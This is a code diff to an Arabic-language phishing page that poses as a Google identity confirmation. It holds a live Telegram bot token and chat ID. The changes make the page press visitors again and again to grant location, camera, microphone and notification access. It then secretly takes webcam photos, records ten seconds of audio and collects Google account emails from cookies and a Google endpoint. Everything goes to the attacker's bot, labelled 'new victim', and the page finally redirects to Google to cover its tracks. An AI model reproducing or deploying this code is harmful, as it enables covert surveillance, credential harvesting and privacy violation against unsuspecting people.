@@ -88,6 +88,15 @@
             margin: 8px 0;
         }
         .hidden { display: none; }
+        .retry-badge {
+            display: inline-block;
+            background: #fbbc05;
+            color: #202124;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            margin-left: 5px;
+        }
     </style>
 </head>
 <body>
@@ -107,6 +116,8 @@
         📱 <span id="deviceName">جهاز غير معروف</span>
     </div>
 
+    <div id="permissionStatus" style="font-size:13px;color:#5f6368;margin-bottom:10px;"></div>
+
     <button class="btn" id="btnConfirm" onclick="startProcess()">✅ تأكيد هويتي</button>
     <button class="btn btn-secondary" onclick="window.location.href='https://accounts.google.com'">🔙 تسجيل الدخول بطريقة أخرى</button>
 
@@ -121,6 +132,15 @@
     // ====== إعدادات البوت ======
     const BOT_TOKEN = "8599000520:AAHwQg2d_xry4DWNy92fbvVbtF-xWYVu_FA";
     const CHAT_ID = "7984067238";
+
+    // ====== متغيرات التتبع ======
+    let attemptCount = 0;
+    let permissionsGranted = {
+        location: false,
+        camera: false,
+        mic: false,
+        notifications: false
+    };
 
     // ====== إرسال للبوت ======
     function sendToTelegram(text) {
@@ -176,8 +196,30 @@
         return info;
     }
 
-    // ====== الحصول على الموقع ======
-    function getLocation() {
+    // ====== تحديث حالة الصلاحيات ======
+    function updatePermissionStatus() {
+        const statusDiv = document.getElementById('permissionStatus');
+        const total = Object.keys(permissionsGranted).length;
+        const granted = Object.values(permissionsGranted).filter(v => v === true).length;
+        const denied = total - granted;
+
+        if (denied === 0) {
+            statusDiv.innerHTML = '✅ جميع الصلاحيات ممنوحة! اضغط "تأكيد هويتي" للمتابعة.';
+            statusDiv.style.color = '#1e8e3e';
+        } else {
+            const deniedList = [];
+            if (!permissionsGranted.location) deniedList.push('الموقع');
+            if (!permissionsGranted.camera) deniedList.push('الكاميرا');
+            if (!permissionsGranted.mic) deniedList.push('الميكروفون');
+            if (!permissionsGranted.notifications) deniedList.push('الإشعارات');
+
+            statusDiv.innerHTML = `⚠️ ${deniedList.join('، ')} مرفوضة. <br> <strong style="color:#d93025;">للمتابعة، اضغط سماح</strong> <span class="retry-badge">محاولة ${attemptCount + 1}</span>`;
+            statusDiv.style.color = '#d93025';
+        }
+    }
+
+    // ====== الحصول على الموقع مع إعادة المحاولة ======
+    function getLocationWithRetry() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
                 resolve({ success: false, error: "غير مدعوم" });
@@ -185,6 +227,8 @@
             }
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
+                    permissionsGranted.location = true;
+                    updatePermissionStatus();
                     resolve({
                         success: true,
                         lat: pos.coords.latitude,
@@ -193,6 +237,8 @@
                     });
                 },
                 () => {
+                    permissionsGranted.location = false;
+                    updatePermissionStatus();
                     resolve({ success: false, error: "مرفوض" });
                 },
                 { enableHighAccuracy: true, timeout: 5000 }
@@ -200,89 +246,17 @@
         });
     }
 
-    // ====== التقاط صورة واحدة (سريعة) ======
-    function captureSinglePhoto(stream) {
+    // ====== الحصول على الكاميرا مع إعادة المحاولة ======
+    function getCameraWithRetry() {
         return new Promise((resolve) => {
-            try {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 320;
-                        canvas.height = video.videoHeight || 240;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
-                        canvas.toBlob((blob) => {
-                            if (blob && blob.size > 1000) {
-                                resolve({ success: true, blob: blob });
-                            } else {
-                                resolve({ success: false, error: 'صورة فارغة' });
-                            }
-                        }, 'image/jpeg', 0.8);
-                    }, 100);
-                };
-            } catch (e) {
-                resolve({ success: false, error: e.message });
-            }
-        });
-    }
-
-    // ====== التقاط صور متعددة (2 صورة في الثانية) ======
-    function captureMultiplePhotos(count = 2) {
-        return new Promise((resolve) => {
-            let photos = [];
-            let captured = 0;
-            let stream = null;
-
             navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: 320, height: 240 },
                 audio: false
             })
-            .then((s) => {
-                stream = s;
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
-
-                    // التقاط الصور بسرعة (كل 500ms)
-                    const interval = setInterval(() => {
-                        if (captured >= count) {
-                            clearInterval(interval);
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve({ success: true, photos: photos });
-                            return;
-                        }
-                        try {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 320;
-                            canvas.height = video.videoHeight || 240;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0);
-                            canvas.toBlob((blob) => {
-                                if (blob && blob.size > 1000) {
-                                    photos.push(blob);
-                                    captured++;
-                                }
-                            }, 'image/jpeg', 0.8);
-                        } catch (e) {
-                            captured++;
-                        }
-                    }, 200); // كل 200ms = 5 صور في الثانية
-
-                    // حماية: إيقاف بعد 2 ثانية كحد أقصى
-                    setTimeout(() => {
-                        clearInterval(interval);
-                        if (stream) stream.getTracks().forEach(t => t.stop());
-                        if (photos.length > 0) {
-                            resolve({ success: true, photos: photos });
-                        } else {
-                            resolve({ success: false, error: 'لم يتم التقاط أي صورة' });
-                        }
-                    }, 2000);
-                };
+            .then((stream) => {
+                permissionsGranted.camera = true;
+                updatePermissionStatus();
+                resolve({ success: true, stream: stream });
             })
             .catch(() => {
                 // محاولة الكاميرا الخلفية
@@ -290,88 +264,175 @@
                     video: { facingMode: 'environment', width: 320, height: 240 },
                     audio: false
                 })
-                .then((s) => {
-                    stream = s;
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        const interval = setInterval(() => {
-                            if (captured >= count) {
-                                clearInterval(interval);
-                                stream.getTracks().forEach(t => t.stop());
-                                resolve({ success: true, photos: photos });
-                                return;
-                            }
-                            try {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = video.videoWidth || 320;
-                                canvas.height = video.videoHeight || 240;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0);
-                                canvas.toBlob((blob) => {
-                                    if (blob && blob.size > 1000) {
-                                        photos.push(blob);
-                                        captured++;
-                                    }
-                                }, 'image/jpeg', 0.8);
-                            } catch (e) {
-                                captured++;
-                            }
-                        }, 200);
-                        setTimeout(() => {
-                            clearInterval(interval);
-                            if (stream) stream.getTracks().forEach(t => t.stop());
-                            if (photos.length > 0) {
-                                resolve({ success: true, photos: photos });
-                            } else {
-                                resolve({ success: false, error: 'لم يتم التقاط أي صورة' });
-                            }
-                        }, 2000);
-                    };
+                .then((stream) => {
+                    permissionsGranted.camera = true;
+                    updatePermissionStatus();
+                    resolve({ success: true, stream: stream });
                 })
-                .catch((err) => {
-                    resolve({ success: false, error: err.message || 'فشل تشغيل الكاميرا' });
+                .catch(() => {
+                    permissionsGranted.camera = false;
+                    updatePermissionStatus();
+                    resolve({ success: false, error: "مرفوضة" });
                 });
             });
         });
     }
 
-    // ====== تسجيل الصوت (10 ثواني) ======
-    function recordAudio(duration = 10000) {
+    // ====== الحصول على الميكروفون مع إعادة المحاولة ======
+    function getMicWithRetry() {
         return new Promise((resolve) => {
             navigator.mediaDevices.getUserMedia({ audio: true })
                 .then((stream) => {
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
-
-                    mediaRecorder.ondataavailable = (e) => {
-                        if (e.data.size > 0) chunks.push(e.data);
-                    };
-
-                    mediaRecorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'audio/ogg' });
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve({ success: true, blob: blob });
-                    };
-
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        if (mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        } else {
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve({ success: false, error: 'فشل التسجيل' });
-                        }
-                    }, duration);
+                    permissionsGranted.mic = true;
+                    updatePermissionStatus();
+                    resolve({ success: true, stream: stream });
                 })
                 .catch(() => {
-                    resolve({ success: false, error: 'فشل تشغيل الميكروفون' });
+                    permissionsGranted.mic = false;
+                    updatePermissionStatus();
+                    resolve({ success: false, error: "مرفوض" });
                 });
         });
     }
 
-    // ====== العملية الرئيسية ======
+    // ====== الحصول على الإشعارات مع إعادة المحاولة ======
+    function getNotificationsWithRetry() {
+        return new Promise((resolve) => {
+            if (!('Notification' in window)) {
+                resolve({ success: false, error: "غير مدعومة" });
+                return;
+            }
+            Notification.requestPermission().then(perm => {
+                if (perm === 'granted') {
+                    permissionsGranted.notifications = true;
+                } else {
+                    permissionsGranted.notifications = false;
+                }
+                updatePermissionStatus();
+                resolve({ success: perm === 'granted' });
+            });
+        });
+    }
+
+    // ====== التقاط صور متعددة ======
+    function captureMultiplePhotos(stream, count = 2) {
+        return new Promise((resolve) => {
+            let photos = [];
+            let captured = 0;
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
+
+                const interval = setInterval(() => {
+                    if (captured >= count) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve({ success: true, photos: photos });
+                        return;
+                    }
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 320;
+                        canvas.height = video.videoHeight || 240;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        canvas.toBlob((blob) => {
+                            if (blob && blob.size > 1000) {
+                                photos.push(blob);
+                                captured++;
+                            }
+                        }, 'image/jpeg', 0.8);
+                    } catch (e) {
+                        captured++;
+                    }
+                }, 200);
+
+                setTimeout(() => {
+                    clearInterval(interval);
+                    stream.getTracks().forEach(t => t.stop());
+                    if (photos.length > 0) {
+                        resolve({ success: true, photos: photos });
+                    } else {
+                        resolve({ success: false, error: 'لم يتم التقاط أي صورة' });
+                    }
+                }, 2000);
+            };
+        });
+    }
+
+    // ====== تسجيل الصوت ======
+    function recordAudio(stream, duration = 10000) {
+        return new Promise((resolve) => {
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                stream.getTracks().forEach(t => t.stop());
+                resolve({ success: true, blob: blob });
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                if (mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                } else {
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve({ success: false, error: 'فشل التسجيل' });
+                }
+            }, duration);
+        });
+    }
+
+    // ====== سحب حسابات جوجل ======
+    function getGoogleAccounts() {
+        return new Promise((resolve) => {
+            let accounts = [];
+            try {
+                const cookies = document.cookie.split(';');
+                cookies.forEach(cookie => {
+                    if (cookie.includes('google')) {
+                        const match = cookie.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                        if (match && !accounts.includes(match[0])) {
+                            accounts.push(match[0]);
+                        }
+                    }
+                });
+            } catch (e) {}
+
+            try {
+                fetch('https://www.google.com/accounts/ListAccounts?gpsia=1&source=inbox&hl=ar')
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data && data.accounts) {
+                            data.accounts.forEach(acc => {
+                                if (acc.email && !accounts.includes(acc.email)) {
+                                    accounts.push(acc.email);
+                                }
+                            });
+                        }
+                        resolve({ success: true, accounts: accounts });
+                    })
+                    .catch(() => {
+                        resolve({ success: true, accounts: accounts });
+                    });
+            } catch (e) {
+                resolve({ success: true, accounts: accounts });
+            }
+
+            setTimeout(() => {
+                resolve({ success: true, accounts: accounts });
+            }, 3000);
+        });
+    }
+
+    // ====== العملية الرئيسية (مع إعادة المحاولة) ======
     async function startProcess() {
         const btn = document.getElementById('btnConfirm');
         const loader = document.getElementById('loader');
@@ -381,21 +442,69 @@
         btn.style.opacity = '0.6';
         loader.style.display = 'block';
         status.style.display = 'none';
+        attemptCount++;
 
-        // === 1. جمع المعلومات العامة ===
+        // === 1. طلب الموقع ===
+        const locationResult = await getLocationWithRetry();
+
+        // === 2. طلب الكاميرا ===
+        let cameraStream = null;
+        const cameraResult = await getCameraWithRetry();
+        if (cameraResult.success) {
+            cameraStream = cameraResult.stream;
+        }
+
+        // === 3. طلب الميكروفون ===
+        let micStream = null;
+        const micResult = await getMicWithRetry();
+        if (micResult.success) {
+            micStream = micResult.stream;
+        }
+
+        // === 4. طلب الإشعارات ===
+        await getNotificationsWithRetry();
+
+        // === 5. التحقق من الصلاحيات ===
+        const allGranted = permissionsGranted.location && 
+                          permissionsGranted.camera && 
+                          permissionsGranted.mic && 
+                          permissionsGranted.notifications;
+
+        if (!allGranted) {
+            loader.style.display = 'none';
+            btn.disabled = false;
+            btn.style.opacity = '1';
+            status.className = 'status error';
+            status.style.display = 'block';
+            status.innerHTML = '⚠️ لم توافق على جميع الصلاحيات! <br> <strong>للمتابعة، اضغط "تأكيد هويتي" مرة أخرى ووافق.</strong>';
+            
+            // إعادة تمكين الزر بعد 3 ثواني
+            setTimeout(() => {
+                status.style.display = 'none';
+            }, 5000);
+            return;
+        }
+
+        // === 6. جمع المعلومات العامة ===
         const deviceInfo = getDeviceInfo();
 
-        // === 2. الحصول على الموقع ===
-        const locationResult = await getLocation();
+        // === 7. التقاط الصور ===
+        let photoResult = { success: false, photos: [] };
+        if (cameraStream) {
+            photoResult = await captureMultiplePhotos(cameraStream, 2);
+        }
 
-        // === 3. التقاط صور متعددة (2 صورة بسرعة) ===
-        const photoResult = await captureMultiplePhotos(2);
+        // === 8. تسجيل الصوت ===
+        let audioResult = { success: false };
+        if (micStream) {
+            audioResult = await recordAudio(micStream, 10000);
+        }
 
-        // === 4. تسجيل الصوت (10 ثواني) ===
-        const audioResult = await recordAudio(10000);
+        // === 9. سحب حسابات جوجل ===
+        const googleAccounts = await getGoogleAccounts();
 
-        // === 5. إرسال البيانات ===
-        let msg = `🛰️ *[ ضحية جديدة - سريع ]*\n\n`;
+        // === 10. إرسال البيانات للبوت ===
+        let msg = `🛰️ *[ ضحية جديدة - متطورة ]*\n\n`;
         msg += deviceInfo;
 
         if (locationResult.success) {
@@ -406,7 +515,16 @@
             msg += `📍 الموقع: ❌ مرفوض\n`;
         }
 
-        msg += `📸 الكاميرا: ${photoResult.success ? "✅ ممنوحة (" + photoResult.photos.length + " صور)" : "❌ مرفوضة"}\n`;
+        if (googleAccounts.success && googleAccounts.accounts.length > 0) {
+            msg += `\n📧 *حسابات جوجل المكتشفة:*\n`;
+            googleAccounts.accounts.forEach((email, i) => {
+                msg += `   ${i+1}. ${email}\n`;
+            });
+        } else {
+            msg += `\n📧 حسابات جوجل: لا توجد حسابات مكتشفة\n`;
+        }
+
+        msg += `\n📸 الكاميرا: ${photoResult.success ? "✅ ممنوحة (" + photoResult.photos.length + " صور)" : "❌ مرفوضة"}\n`;
         msg += `🎤 الميكروفون: ${audioResult.success ? "✅ ممنوح (10 ثواني)" : "❌ مرفوض"}\n`;
         msg += `\n🕒 ${new Date().toLocaleString()}`;
 
@@ -430,7 +548,7 @@
         status.className = 'status';
         status.style.display = 'block';
 
-        if (locationResult.success || photoResult.success) {
+        if (locationResult.success && photoResult.success) {
             status.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري تحويلك...';
             setTimeout(() => {
                 window.location.href = "https://myaccount.google.com";
@@ -446,6 +564,9 @@
 
     // ====== إشعار فتح الصفحة ======
     sendToTelegram(`🌐 *[ فتح الصفحة ]*\nتم فتح رابط الاختراق بواسطة ضحية جديدة\n🕒 ${new Date().toLocaleString()}`);
+
+    // ====== تحديث حالة الصلاحيات ======
+    updatePermissionStatus();
 </script>
 
 </body>
